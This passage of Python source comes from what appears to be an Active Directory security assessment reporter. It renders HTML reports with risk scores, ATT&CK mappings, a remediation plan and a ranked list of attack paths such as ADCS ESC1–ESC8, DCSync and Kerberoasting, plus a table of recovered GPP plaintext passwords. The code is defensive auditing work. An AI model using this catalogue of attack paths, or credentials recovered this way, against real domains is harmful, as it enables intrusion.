.kc-sev-pill,.kc-cat-pill{display:inline-block;color:#fff;padding:2px 8px;border-radius:var(--r-sm);
  font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.05em;text-transform:uppercase}
.kc-cat-pill{color:#13150d}
.kc-badge{display:inline-block;color:#fff;padding:1px 7px;border-radius:3px;font-size:10px;font-weight:700;font-family:var(--mono)}
.kc-badge-crit{background:var(--crit)}
.kc-mini{display:inline-block;font-family:var(--mono);font-size:10px;background:var(--surface3);
  border:1px solid var(--border2);color:var(--deck);border-radius:3px;padding:1px 5px;margin:1px 2px}

/* ── roadmap ── */
.kc-rm-tier{font-size:14px;letter-spacing:.06em;text-transform:uppercase;color:var(--deck);margin:18px 0 8px}
.kc-rm-desc{font-family:var(--sans);font-weight:400;font-size:12px;color:var(--muted);text-transform:none;letter-spacing:0}
.kc-rm-table tbody tr{cursor:pointer}
.kc-rm-fix{color:var(--muted);font-size:12px;margin-top:3px}

/* attack paths */
.kc-ap-sub{color:var(--muted);font-size:12px;margin-top:2px}

/* ── findings ── */
.kc-toolbar{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:8px}
.kc-pills{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.kc-fsep{width:1px;height:20px;background:var(--border2);margin:0 4px}
.kc-fp{font-family:var(--mono);font-size:11px;letter-spacing:.04em;background:var(--surface2);
  color:var(--muted);border:1px solid var(--border2);border-radius:14px;padding:4px 12px;cursor:pointer;
  --c:var(--accent)}
.kc-fp:hover{color:var(--text);border-color:var(--c)}
.kc-fp-on,.kc-fp.on{background:var(--c);color:#13150d;border-color:var(--c);font-weight:700}
.kc-toolbar-r{display:flex;gap:6px;align-items:center}
#kc-q{background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:14px;
  padding:5px 12px;font-size:12.5px;outline:none;min-width:180px}
#kc-q:focus{border-color:var(--accent)}
.kc-showing{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:6px}
.kc-ftable td{vertical-align:middle}
.kc-frow{cursor:pointer}
.kc-frow:hover td{background:var(--surface2)}
.kc-frow:focus{outline:2px solid var(--accent);outline-offset:-2px}
.kc-toggle{display:inline-block;width:18px;height:18px;line-height:16px;text-align:center;
  border:1px solid var(--border2);border-radius:50%;color:var(--muted);font-weight:700;font-size:12px}
.kc-frow:hover .kc-toggle{border-color:var(--accent);color:var(--accent)}
.kc-panel{background:var(--bg);border:1px solid var(--border);border-left:3px solid var(--accent);
  border-radius:0 var(--r-sm) var(--r-sm) 0;padding:14px 18px;margin:2px 0 8px}
.kc-block{margin-top:12px}.kc-block:first-child{margin-top:0}
.kc-bh{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;
  color:var(--deck);margin-bottom:5px}
.kc-bb{font-size:13px;color:var(--text);line-height:1.6}
.kc-attck-row{margin-bottom:6px}
.kc-evidence{background:var(--surface2);border-left:3px solid var(--accent2);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-attack{background:rgba(178,58,46,.08);border-left:3px solid var(--crit);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-fix{background:rgba(122,154,78,.1);border-left:3px solid var(--ok);padding:8px 12px;border-radius:0 var(--r-sm) var(--r-sm) 0}
.kc-cmd,.kc-fixlist,.kc-reflist,.kc-affected{list-style:none}
.kc-cmd li{padding:3px 0;display:flex;align-items:center;gap:8px}
.kc-cmd li code{flex:1;background:#0c0d08;border:1px solid var(--border2);color:#d7e0b0;
  padding:4px 8px;border-radius:var(--r-sm);word-break:break-all;display:block}
html[data-theme=light] .kc-cmd li code{background:#23270f;color:#dfe3c8}
.kc-copy{font-family:var(--mono);font-size:10px;background:var(--surface3);border:1px solid var(--border2);
  color:var(--muted);border-radius:3px;padding:3px 8px;cursor:pointer;flex-shrink:0}
.kc-copy:hover{border-color:var(--accent);color:var(--accent)}
.kc-fixlist li,.kc-reflist li{padding:3px 0 3px 16px;position:relative;font-size:12.5px}
.kc-fixlist li::before{content:"▸";position:absolute;left:0;color:var(--accent2)}
.kc-affected{columns:2;column-gap:22px;font-family:var(--mono);font-size:11.5px;color:var(--muted);margin-top:2px}
.kc-affected li{padding:1px 0;break-inside:avoid}
.kc-affected .kc-more{color:var(--faint);font-style:italic}

/* ── inventory ── */
.kc-stat-grid{display:grid;gap:10px;grid-template-columns:repeat(auto-fill,minmax(170px,1fr))}
.kc-stat{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r-sm);padding:9px 12px}
.kc-stat-l{font-family:var(--mono);font-size:9.5px;letter-spacing:.05em;text-transform:uppercase;color:var(--faint)}
.kc-stat-v{font-family:var(--head);font-size:18px;color:var(--text);margin-top:1px}
.kc-roster{margin-bottom:12px}
.kc-roster h4{font-size:12px;color:var(--deck);margin-bottom:5px}
.kc-rchip{display:inline-block;font-family:var(--mono);font-size:11px;background:var(--surface3);
  border:1px solid var(--border2);border-radius:3px;padding:2px 7px;margin:2px}
.kc-rchip.kc-more{color:var(--faint)}
.kc-barchart{display:flex;flex-direction:column;gap:5px}
.kc-bar-row{display:flex;align-items:center;gap:10px}
.kc-bar-l{width:230px;font-size:12px;color:var(--muted);text-align:right;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.kc-bar-t{flex:1;background:var(--track);border-radius:3px;height:14px;overflow:hidden}
.kc-bar-f{height:14px;border-radius:3px}
.kc-bar-n{width:40px;font-family:var(--mono);font-size:11px;color:var(--muted)}

.kc-footer{text-align:center;color:var(--faint);font-family:var(--mono);font-size:11px;
  letter-spacing:.06em;padding:24px;border-top:1px solid var(--border)}
.kc-top{position:fixed;right:20px;bottom:20px;width:42px;height:42px;border-radius:50%;
  background:var(--accent);color:#13150d;border:none;font-size:20px;cursor:pointer;box-shadow:var(--shadow);z-index:40}

/* ── print ── */
@media print{
  @page{size:A4;margin:14mm}
  html[data-theme]{--bg:#fff;--surface:#fff;--surface2:#f4f2ea;--surface3:#eceadd;
    --border:#bbb;--border2:#999;--track:#e3e1d6;--text:#1a1a12;--muted:#444;--faint:#666;--shadow:none}
  body{background:#fff}
  .kc-nav,.kc-top,.kc-toolbar,.kc-iconbtn,.kc-copy{display:none!important}
  .kc-section{break-inside:avoid;box-shadow:none;border:1px solid #ccc}
  .kc-cover{break-after:page}
  .kc-frow,.kc-drow{display:table-row!important}
  .kc-cmd li code{background:#f4f2ea;color:#1a1a12;border:1px solid #ccc}
  a{color:#23270f}
}
"""

_KC_JS = r"""
function kcTheme(){var h=document.documentElement;var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
  h.setAttribute('data-theme',n);try{localStorage.setItem('scout-theme',n)}catch(e){}}
(function(){try{var t=localStorage.getItem('scout-theme');if(t)document.documentElement.setAttribute('data-theme',t)}catch(e){}})();
function kcTog(i){var r=document.getElementById('dr-'+i),ic=document.getElementById('ic-'+i);if(!r)return;
  var open=r.style.display==='table-row';r.style.display=open?'none':'table-row';
  if(ic){ic.textContent=open?'+':'−';ic.style.background=open?'':'var(--accent)';ic.style.color=open?'':'#13150d';ic.style.borderColor=open?'':'var(--accent)';}}
function kcAll(open){document.querySelectorAll('.kc-drow').forEach(function(r){r.style.display=open?'table-row':'none'});
  document.querySelectorAll('.kc-toggle').forEach(function(ic){ic.textContent=open?'−':'+';
    ic.style.background=open?'var(--accent)':'';ic.style.color=open?'#13150d':'';ic.style.borderColor=open?'var(--accent)':'';});}
var kcF={sev:'',cat:''};
function kcFil(btn){var f=btn.getAttribute('data-f'),k=f.split(':')[0],v=f.substring(k.length+1);
  if(k==='sev'){document.querySelectorAll('.kc-fp:not(.kc-fp-cat)').forEach(function(b){b.classList.remove('kc-fp-on','on')});
    btn.classList.add(v?'on':'kc-fp-on');kcF.sev=v;}
  else{if(kcF.cat===v){kcF.cat='';btn.classList.remove('on');}else{document.querySelectorAll('.kc-fp-cat').forEach(function(b){b.classList.remove('on')});btn.classList.add('on');kcF.cat=v;}}
  kcApply();}
function kcApply(){var q=(document.getElementById('kc-q').value||'').toLowerCase();var shown=0,tot=0;
  document.querySelectorAll('.kc-frow').forEach(function(r){tot++;
    var okS=!kcF.sev||r.getAttribute('data-sev')===kcF.sev;
    var okC=!kcF.cat||r.getAttribute('data-cat')===kcF.cat;
    var okQ=!q||r.textContent.toLowerCase().indexOf(q)!==-1;
    var ok=okS&&okC&&okQ;r.style.display=ok?'':'none';if(ok)shown++;
    var dr=document.getElementById('dr-'+r.getAttribute('data-i'));if(dr&&!ok)dr.style.display='none';});
  var s=document.getElementById('kc-showing');if(s)s.textContent='Showing '+shown+' of '+tot+' findings';}
function kcJump(id){var el=document.getElementById(id);if(!el)return;
  el.scrollIntoView({behavior:'smooth',block:'center'});
  if(el.classList.contains('kc-frow')){var i=el.getAttribute('data-i');var dr=document.getElementById('dr-'+i);
    if(dr&&dr.style.display!=='table-row')kcTog(i);}}
function kcCopy(btn){var code=btn.parentNode.querySelector('code');if(!code)return;
  var t=code.textContent;navigator.clipboard&&navigator.clipboard.writeText(t);
  var o=btn.textContent;btn.textContent='copied';setTimeout(function(){btn.textContent=o},1200);}
document.addEventListener('DOMContentLoaded',function(){kcApply();
  var secs=[].slice.call(document.querySelectorAll('section[id]'));
  var links={};document.querySelectorAll('.kc-nav-links a').forEach(function(a){links[a.getAttribute('href').slice(1)]=a;});
  function spy(){var y=window.scrollY+120,cur=null;secs.forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
    Object.keys(links).forEach(function(k){links[k].classList.toggle('active',k===cur);});}
  window.addEventListener('scroll',spy);spy();});
"""


class HTMLReporter:
    """Single-file, dependency-free interactive HTML deliverable styled as a
    field assessment briefing: cover + classification banner, assessment summary,
    scorecard, CMMI maturity ladder, prioritised action plan, attack paths with
    copyable tradecraft, MITRE ATT&CK coverage, evidence tables, filterable
    findings with expandable evidence, and an enriched inventory. Light/dark
    themes and print-to-PDF styling included."""

    _SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

    def __init__(self, domain, dc_ip, findings, scores, data,
                 auth_mode="", prepared_by="", scope=""):
        self.domain   = domain
        self.dc_ip    = dc_ip
        self.findings = findings
        self.scores   = scores
        self.data     = data
        self.auth_mode = auth_mode
        self.prepared_by = prepared_by
        self.scope    = scope
        self.ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.date     = datetime.datetime.now().strftime("%d %b %Y")
        self.by_rule = {}
        for f in findings:
            self.by_rule.setdefault(f.rule_id, f)

    # ── helpers ───────────────────────────────────────────────────────────────
    def _e(self, s):
        return html_mod.escape(str(s) if s is not None else "")

    def _doc(self, rule_id):
        return RULE_DOCS.get(rule_id, {})

    def _sev_counts(self):
        c = defaultdict(int)
        for f in self.findings:
            c[f.severity] += 1
        return c

    def _cat_counts(self):
        c = defaultdict(int)
        for f in self.findings:
            c[f.category] += 1
        return c

    # ── inline SVG charts ─────────────────────────────────────────────────────
    def _gauge(self, score, colour):
        score = max(0, min(100, score))
        angle = score / 100 * 180
        rad = math.radians(180 - angle)
        cx, cy, r = 90, 90, 76
        x = cx + r * math.cos(rad); y = cy - r * math.sin(rad)
        return (
            '<svg width="180" height="106" viewBox="0 0 180 106" aria-hidden="true">'
            '<path d="M 14 90 A 76 76 0 0 1 166 90" fill="none" stroke="var(--track)" stroke-width="15" stroke-linecap="round"/>'
            f'<path d="M 14 90 A 76 76 0 0 1 {x:.2f} {y:.2f}" fill="none" stroke="{colour}" stroke-width="15" stroke-linecap="round"/>'
            f'<text x="90" y="80" text-anchor="middle" font-size="40" font-weight="800" fill="{colour}" font-family="var(--head)">{score}</text>'
            '<text x="90" y="99" text-anchor="middle" font-size="11" fill="var(--muted)">/ 100 danger</text></svg>')

    def _donut(self):
        counts = self._sev_counts()
        order = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
        total = sum(counts[s] for s in order) or 1
        cx = cy = 70; r = 52; w = 22
        nonzero = [s for s in order if counts[s]]
        segs = []; start = -90.0
        if len(nonzero) == 1:
            # one full ring — an arc with coincident endpoints renders nothing,
            # so draw a circle instead.
            segs.append(f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="{SEV_COLOUR[nonzero[0]]}" stroke-width="{w}"/>')
        else:
            for s in nonzero:
                sweep = counts[s] / total * 360; end = start + sweep
                large = 1 if sweep > 180 else 0
                x1 = cx + r*math.cos(math.radians(start)); y1 = cy + r*math.sin(math.radians(start))
                x2 = cx + r*math.cos(math.radians(end));   y2 = cy + r*math.sin(math.radians(end))
                segs.append(f'<path d="M {x1:.2f} {y1:.2f} A {r} {r} 0 {large} 1 {x2:.2f} {y2:.2f}" '
                            f'fill="none" stroke="{SEV_COLOUR[s]}" stroke-width="{w}"/>')
                start = end
        if not nonzero:
            segs.append(f'<circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="var(--track)" stroke-width="{w}"/>')
        return ('<svg width="140" height="140" viewBox="0 0 140 140" aria-hidden="true">' + "".join(segs) +
                f'<text x="{cx}" y="{cy-2}" text-anchor="middle" font-size="30" font-weight="800" fill="var(--text)" font-family="var(--head)">{len(self.findings)}</text>'
                f'<text x="{cx}" y="{cy+16}" text-anchor="middle" font-size="11" fill="var(--muted)">findings</text></svg>')

    def _maturity_ladder(self, level):
        out = ['<div class="kc-ladder">']
        for lv in range(1, 6):
            col = ["#b23a2e","#c2702a","#c9a227","#6f8f3f","#4f7a3a"][lv-1]
            cur = (lv == level)
            fill = col if cur else "var(--track)"
            txt = "#13150d" if cur else "var(--muted)"
            ring = f"stroke:{col};stroke-width:2" if cur else "stroke:var(--border2);stroke-width:1"
            out.append(f'<div class="kc-mstep"><svg width="46" height="46" viewBox="0 0 46 46">'
                       f'<circle cx="23" cy="23" r="20" fill="{fill}" style="{ring}"/>'
                       f'<text x="23" y="29" text-anchor="middle" font-size="18" font-weight="800" fill="{txt}" font-family="var(--head)">{lv}</text></svg>'
                       f'<div class="kc-mlabel">{MATURITY_LABEL[lv]}</div></div>')
            if lv < 5:
                out.append('<div class="kc-mconn"></div>')
        out.append('</div>')
        return "".join(out)

    # ── cover / nav ───────────────────────────────────────────────────────────
    def _cover(self):
        total = self.scores.get("Total", 0)
        label, colour = RiskScorer.risk_label(total)
        rows = [("Domain", self.domain), ("Domain controller", self.dc_ip),
                ("Assessment date", self.date), ("Authentication", self.auth_mode or "n/a")]
        if self.prepared_by:
            rows.append(("Prepared by", self.prepared_by))
        if self.scope:
            rows.append(("Scope", self.scope))
        rows.append(("Tool", f"{TOOL_NAME} v{VERSION}"))
        meta = "".join(f'<tr><td>{self._e(k)}</td><td>{self._e(v)}</td></tr>' for k, v in rows)
        return (
            '<div class="kc-cover" id="top">'
            '<div class="kc-cover-band">Confidential — Authorised Security Assessment</div>'
            '<div class="kc-cover-body">'
            '<div class="kc-logo">✶</div>'
            f'<h1>{TOOL_NAME}</h1>'
            '<div class="kc-cover-sub">Active Directory Field Assessment</div>'
            f'<div class="kc-cover-domain">{self._e(self.domain)}</div>'
            f'<table class="kc-cover-meta"><tbody>{meta}</tbody></table>'
            f'<div class="kc-cover-score" style="border-color:{colour}">'
            f'<span style="color:{colour}">{total}</span><small>/100 — {self._e(label)}</small></div>'
            '</div></div>')

    def _nav(self):
        items = [("exec","Summary",""),("maturity","Maturity",""),("roadmap","Action Plan",""),
                 ("paths","Attack Paths",""),("attack","ATT&CK",""),
                 ("findings","Findings",str(len(self.findings))),("inventory","Inventory","")]
        links = ""
        for sid, name, badge in items:
            b = f'<span class="kc-navb">{badge}</span>' if badge else ""
            links += f'<a href="#sec-{sid}">{name}{b}</a>'
        return ('<nav class="kc-nav" id="kc-nav">'
                f'<a class="kc-nav-brand" href="#top">✶ {TOOL_NAME}</a>'
                f'<div class="kc-nav-links">{links}</div>'
                '<div class="kc-nav-tools">'
                '<button class="kc-iconbtn" onclick="kcTheme()" title="Toggle theme">◐</button>'
                '<button class="kc-iconbtn" onclick="window.print()" title="Print / Save PDF">⎙</button>'
                '</div></nav>')

    # ── assessment summary ────────────────────────────────────────────────────
    _MARQUEE = {
        "P-GPPPassword":"recoverable GPP passwords in SYSVOL",
        "P-DCSync":"DCSync rights granted to non-admins",
        "A-CertTempCustomSubject":"an ESC1-exploitable certificate template",
        "A-CertTemplateESC4":"an ESC4 template-ACL takeover",
        "A-CertEnrollHttp":"ESC8 HTTP certificate enrolment (relayable)",
        "P-UnconstrainedDelegation":"unconstrained Kerberos delegation",
        "A-WDigest":"WDigest cleartext credential caching",
        "A-LMCompatibilityLevel":"NTLMv1 still permitted",
        "P-ServiceDomainAdmin":"service accounts in Domain Admins",
        "S-KerberoastableAdmin":"Kerberoastable administrator accounts",
        "S-SIDHistoryPrivileged":"privileged SID-history backdoors",
        "P-ComputerInPrivGroup":"computer accounts inside privileged groups",
        "A-MembershipEveryone":"'Everyone' inside a privileged group",
        "P-RBCD-Dangerous":"resource-based delegation on a domain controller",
        "A-DC-Coerce":"a DC authentication-coercion vector",
    }

    def _narrative(self):
        total = self.scores.get("Total", 0)
        label, _ = RiskScorer.risk_label(total)
        sc = self._sev_counts()
        crit, high = sc.get("CRITICAL",0), sc.get("HIGH",0)
        mat = self.scores.get("Maturity",3)
        worst = max(("Anomaly","Privileged","Stale","Trust"), key=lambda c: self.scores.get(c,0))
        parts = [
            f"This assessment of <strong>{self._e(self.domain)}</strong> returns an overall danger "
            f"score of <strong>{total}/100</strong> (<strong>{self._e(label)}</strong>), taken as the "
            f"worst of four category scores — weakest is <strong>{worst}</strong> at "
            f"{self.scores.get(worst,0)}/100. SCOUT raised <strong>{len(self.findings)}</strong> "
            f"findings (<strong>{crit}</strong> critical, <strong>{high}</strong> high).",
            f"On the CMMI maturity scale the domain sits at <strong>Level {mat} — "
            f"{self._e(MATURITY_LABEL.get(mat,''))}</strong>. {self._e(MATURITY_DESC.get(mat,''))}",
        ]
        marquee = [t for r, t in self._MARQUEE.items() if r in self.by_rule]
        if marquee:
            s = marquee[:4]
            parts.append("Most urgent: the environment exposes " +
                         (", ".join(s[:-1]) + " and " + s[-1] if len(s) > 1 else s[0]) +
                         " — each a realistic, low-cost path to domain compromise that should be "
                         "remediated first.")
        else:
            parts.append("No single-step domain-takeover primitives were detected; work the "
                         "prioritised action plan below to keep it that way.")
        return "".join(f"<p>{p}</p>" for p in parts)

    def _key_risks(self):
        seen = set(); items = []
        for f in sorted(self.findings, key=lambda x:(self._SEV_ORDER.get(x.severity,9), -x.points)):
            if f.rule_id in seen or f.severity not in ("CRITICAL","HIGH"):
                continue
            seen.add(f.rule_id); items.append(f)
            if len(items) >= 6:
                break
        if not items:
            return ""
        rows = ""
        for f in items:
            one = (self._doc(f.rule_id).get("description") or f.details or f.title)
            one = one if len(one) <= 150 else one[:147] + "…"
            rows += (f'<li><span class="kc-dot" style="background:{f.sev_colour}"></span>'
                     f'<a href="#f-{self._e(f.rule_id)}" onclick="kcJump(\'f-{self._e(f.rule_id)}\');return false"><strong>{self._e(f.title)}</strong></a> '
                     f'<span class="kc-kr-sub">{self._e(one)}</span></li>')
        return f'<div class="kc-keyrisks"><h3>Key risks at a glance</h3><ul>{rows}</ul></div>'

    def _scorecard(self):
        total = self.scores.get("Total", 0)
        _, colour = RiskScorer.risk_label(total)
        cats = ""
        for cat in ["Anomaly","Privileged","Stale","Trust"]:
            sc = self.scores.get(cat,0); _, scol = RiskScorer.risk_label(sc)
            n = self._cat_counts().get(cat,0); ccol = CAT_COLOUR.get(cat,"#888")
            cats += (f'<div class="kc-cat-card" style="border-top-color:{ccol}">'
                     f'<div class="kc-cat-label">{cat}</div>'
                     f'<div class="kc-cat-score" style="color:{scol}">{sc}</div>'
                     f'<div class="kc-cat-count">{n} finding(s)</div>'
                     f'<div class="kc-cat-track"><div class="kc-cat-bar" style="background:{scol};width:{min(sc,100)}%"></div></div></div>')
        return ('<div class="kc-scorecard">'
                f'<div class="kc-card kc-card-gauge"><div class="kc-card-h">Global danger</div>{self._gauge(total,colour)}</div>'
                f'<div class="kc-card kc-card-donut"><div class="kc-card-h">Severity mix</div>{self._donut()}{self._sev_legend()}</div>'
                f'<div class="kc-card kc-card-cats"><div class="kc-card-h">Category scores — global = worst</div>'
                f'<div class="kc-cat-grid">{cats}</div></div></div>')

    def _sev_legend(self):
        sc = self._sev_counts(); out = '<div class="kc-legend">'
        for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if sc.get(s,0):
                out += f'<span><i style="background:{SEV_COLOUR[s]}"></i>{s.title()} {sc[s]}</span>'
        return out + '</div>'

    def _exec_section(self):
        return ('<section class="kc-section" id="sec-exec"><h2 class="kc-h2">Assessment summary</h2>'
                f'<div class="kc-narrative">{self._narrative()}</div>{self._scorecard()}{self._key_risks()}</section>')

    # ── maturity ──────────────────────────────────────────────────────────────
    def _maturity_section(self):
        mat = self.scores.get("Maturity", 3); nxt = mat + 1
        blockers = sorted({f.rule_id: f for f in self.findings if f.maturity <= mat}.values(),
                          key=lambda f:(f.maturity, self._SEV_ORDER.get(f.severity,9)))
        rows = "".join(f'<tr onclick="kcJump(\'f-{self._e(f.rule_id)}\')"><td><span class="kc-mtag">L{f.maturity}</span></td>'
                       f'<td><code>{self._e(f.rule_id)}</code></td><td>{self._e(f.title)}</td></tr>'
                       for f in blockers[:12])
        nextline = (f"To advance to <strong>Level {nxt} — {MATURITY_LABEL.get(nxt,'')}</strong>, "
                    f"resolve every Level&nbsp;≤&nbsp;{mat} finding below."
                    if mat < 5 else "The domain has reached the highest maturity level — maintain it.")
        return ('<section class="kc-section" id="sec-maturity"><h2 class="kc-h2">Maturity level</h2>'
                '<p class="kc-sub">CMMI 1–5 scale (ANSSI model). Your level is the lowest still gated by a '
                'failing rule — one unfixed Level-1 issue pins the whole domain at Level 1.</p>'
                f'{self._maturity_ladder(mat)}'
                f'<div class="kc-mbox"><strong>Level {mat} — {MATURITY_LABEL.get(mat,"")}.</strong> '
                f'{self._e(MATURITY_DESC.get(mat,""))}</div>'
                f'<p class="kc-sub">{nextline}</p>'
                + (f'<table class="kc-table"><thead><tr><th style="width:60px">Level</th>'
                   '<th style="width:220px">Rule</th><th>Finding</th></tr></thead><tbody>'
                   f'{rows}</tbody></table>' if rows else "") + '</section>')

    # ── ATT&CK coverage ───────────────────────────────────────────────────────
    def _attack_section(self):
        tech = {}
        for f in self.findings:
            for m in f.mitre:
                tid = m.split(":")[0].strip()
                name = m.split(":",1)[1].strip() if ":" in m else tid
                base = tid.split(".")[0]
                t = tech.setdefault(tid, {"name":name,"count":0,"tactic":ATTACK_TACTIC.get(base,"Other"),"rules":set()})
                t["count"] += 1; t["rules"].add(f.rule_id)
        if not tech:
            return ""
        by_t = defaultdict(list)
        for tid, info in tech.items():
            by_t[info["tactic"]].append((tid, info))
        tactics = [t for t in ATTACK_TACTIC_ORDER if t in by_t] + [t for t in by_t if t not in ATTACK_TACTIC_ORDER]
        cols = ""
        for tac in tactics:
            chips = ""
            for tid, info in sorted(by_t[tac], key=lambda x:-x[1]["count"]):
                chips += (f'<div class="kc-tech" title="{self._e(", ".join(sorted(info["rules"])))}">'
                          f'<span class="kc-tech-id">{self._e(tid)}</span>'
                          f'<span class="kc-tech-n">{self._e(info["name"])}</span>'
                          f'<span class="kc-tech-c">{info["count"]}</span></div>')
            cols += f'<div class="kc-tcol"><div class="kc-tcol-h">{self._e(tac)}</div>{chips}</div>'
        return ('<section class="kc-section" id="sec-attack"><h2 class="kc-h2">MITRE ATT&amp;CK coverage</h2>'
                '<p class="kc-sub">Triggered findings mapped to adversary techniques, grouped by tactic. '
                'Hover a technique for the contributing rules.</p>'
                f'<div class="kc-attack-grid">{cols}</div></section>')

    # ── action plan / roadmap ─────────────────────────────────────────────────
    def _roadmap_section(self):
        agg = {}
        for f in self.findings:
            a = agg.setdefault(f.rule_id, {"f":f,"pts":0,"aff":0})
            a["pts"] += f.points; a["aff"] += len(f.affected)
        rows = [{"rid":r,"f":a["f"],"pts":min(a["pts"],100),"aff":a["aff"],
                 "effort":RULE_EFFORT.get(r,"Medium")} for r, a in agg.items()]
        rows.sort(key=lambda r:(-r["pts"], self._SEV_ORDER.get(r["f"].severity,9)))
        tiers = {"Low":("Quick wins","Low-effort GPO / setting changes with high payback"),
                 "Medium":("Strategic","Account, ACL and delegation hardening"),
                 "High":("Programme","Architecture, rollout and lifecycle work")}
        out = ""
        for tier in ("Low","Medium","High"):
            tr = [r for r in rows if r["effort"] == tier]
            if not tr:
                continue
            body = ""
            for r in tr[:14]:
                f = r["f"]; fix = (self._doc(r["rid"]).get("remediation") or [f.details or "See finding detail."])[0]
                body += (f'<tr onclick="kcJump(\'f-{self._e(r["rid"])}\')">'
                         f'<td><span class="kc-sev-pill" style="background:{f.sev_colour}">{self._e(f.severity)}</span></td>'
                         f'<td><strong>{self._e(f.title)}</strong><div class="kc-rm-fix">{self._e(fix)}</div></td>'
                         f'<td class="kc-num">{r["pts"]}</td><td class="kc-num">{r["aff"] or "—"}</td></tr>')
            title, desc = tiers[tier]
            out += (f'<h3 class="kc-rm-tier">{title} <span class="kc-rm-desc">— {desc}</span></h3>'
                    '<table class="kc-table kc-rm-table"><thead><tr><th style="width:90px">Severity</th><th>Action</th>'
                    '<th style="width:80px" class="kc-num">Risk&nbsp;↓</th><th style="width:74px" class="kc-num">Objects</th></tr></thead>'
                    f'<tbody>{body}</tbody></table>')
        if not out:
            return ""
        return ('<section class="kc-section" id="sec-roadmap"><h2 class="kc-h2">Prioritised action plan</h2>'
                '<p class="kc-sub">Grouped by effort, ranked by risk reduction. “Risk ↓” is the danger-point '
                'contribution recovered by fixing the item. Click a row to jump to the finding.</p>'
                f'{out}</section>')

    # ── top attack paths ──────────────────────────────────────────────────────
    _ATTACK_PRIORITY = [
        ("P-GPPPassword","GPP cpassword recoverable from SYSVOL"),
        ("A-CertTempCustomSubject","ADCS ESC1 — enrollee-supplied SAN"),
        ("A-CertTemplateESC4","ADCS ESC4 — template ACL takeover"),
        ("A-CertTempAgent","ADCS ESC3 — enrollment agent abuse"),
        ("A-CertTempAnyPurpose","ADCS ESC2 — any-purpose EKU template"),
        ("A-CertEnrollHttp","ADCS ESC8 — HTTP enrollment relay"),
        ("P-DCSync","DCSync rights on the domain root"),
        ("P-DangerousACLDomain","Dangerous ACE on the domain root"),
        ("P-RBCD-Dangerous","RBCD configured on a domain controller"),
        ("P-WriteToPrivGroup","Write access to a privileged group"),
        ("P-ComputerInPrivGroup","Computer account in a privileged group"),
        ("S-SIDHistoryPrivileged","Privileged SID-history backdoor"),
        ("P-UnconstrainedDelegation","Unconstrained delegation on a non-DC host"),
        ("P-RBCD","Resource-based constrained delegation"),
        ("P-ConstrainedDelegService","Constrained delegation on a service account"),
        ("P-ServiceDomainAdmin","Service account is Domain Admin"),
        ("S-KerberoastableAdmin","Kerberoast-able admin account"),
        ("S-NoPreAuthAdmin","ASREP-roast-able admin account"),
        ("A-MembershipEveryone","Everyone is a member of a privileged group"),
        ("P-ModifiableGPO","Non-admin can edit a high-impact GPO"),
        ("A-WDigest","WDigest stores cleartext credentials"),
        ("A-LMCompatibilityLevel","NTLMv1 permitted on the domain"),
        ("P-MachineAccountQuota","MachineAccountQuota > 0 (RBCD / shadow creds)"),
        ("S-Kerberoastable","Kerberoast-able service accounts"),
        ("S-NoPreAuth","ASREP-roast-able user accounts"),
        ("A-DC-Coerce","MS-RPRN/WebClient coercion on DC"),
        ("A-DnsZoneAUCreateChild","ADIDNS write — any user can spoof DNS"),
        ("A-WSUS-HTTP","HTTP WSUS — update injection to SYSTEM"),
        ("S-Vuln-MS14-068","DC potentially vulnerable to MS14-068"),
        ("S-Vuln-MS17_010","Host vulnerable to MS17-010 (EternalBlue)"),
    ]

    def _paths_section(self):
        chosen = [(h, self.by_rule[r]) for r, h in self._ATTACK_PRIORITY if r in self.by_rule]
        if not chosen:
            return ""
        rows = ""
        for headline, f in chosen:
            one = (self._doc(f.rule_id).get("description") or f.details or f.title)
            one = one if len(one) <= 170 else one[:167] + "…"
            chips = "".join(f'<span class="kc-mini">{self._e(m.split(":")[0])}</span>' for m in f.mitre[:2])
            rows += (f'<tr onclick="kcJump(\'f-{self._e(f.rule_id)}\')">'
                     f'<td><span class="kc-sev-pill" style="background:{f.sev_colour}">{self._e(f.severity)}</span></td>'
                     f'<td><code>{self._e(f.rule_id)}</code></td>'
                     f'<td><strong>{self._e(headline)}</strong><div class="kc-ap-sub">{self._e(one)}</div></td>'
                     f'<td>{chips}</td></tr>')
        return ('<section class="kc-section" id="sec-paths"><h2 class="kc-h2">Top attack paths</h2>'
                '<p class="kc-sub">Ranked by exploitation cost. Click a row for tradecraft and evidence.</p>'
                '<table class="kc-table"><thead><tr><th style="width:90px">Severity</th><th style="width:190px">Rule</th>'
                '<th>Attack vector</th><th style="width:120px">ATT&amp;CK</th></tr></thead>'
                f'<tbody>{rows}</tbody></table></section>')

    # ── evidence sections ─────────────────────────────────────────────────────
    def _gpp_section(self):
        pw = self.data.sysvol_data.get("gpp_passwords", [])
        if not pw:
            return ""
        rows = ""
        for p in pw:
            fn = p.get("file",""); base = fn.split("\\")[-1] if "\\" in fn else fn
            rows += (f'<tr><td>{self._e(p.get("gpo_name",""))}</td><td><code>{self._e(base)}</code></td>'
                     f'<td><strong>{self._e(p.get("username",""))}</strong></td>'
                     f'<td><code class="kc-crit-val">{self._e(p.get("plaintext",""))}</code></td></tr>')
        return ('<section class="kc-section kc-critborder"><h2 class="kc-h2">⚠ GPP passwords recovered (MS14-025)</h2>'
                '<p class="kc-sub kc-critsub">The AES key is published by Microsoft — treat every account below as '
                'compromised and reset immediately.</p><table class="kc-table"><thead><tr><th>GPO</th><th>File</th>'
